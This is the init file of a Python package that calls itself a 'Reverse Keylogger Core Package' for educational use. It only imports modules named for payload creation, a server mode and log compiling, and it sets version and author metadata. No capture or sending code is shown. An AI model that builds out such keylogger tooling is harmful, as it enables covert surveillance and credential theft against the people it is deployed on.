"""
Reverse Keylogger Core Package
Educational Purpose Only
"""

from .config import KeyloggerConfig
from .payload_creator import PayloadCreator
from .server import ServerMode
from .app import KeyloggerApp
from .log_compiler import LogCompiler


__version__ = "1.0.0"
__author__ = "NullSpecter404"
__all__ = ['KeyloggerConfig', 'PayloadCreator', 'ServerMode', 'KeyloggerApp']
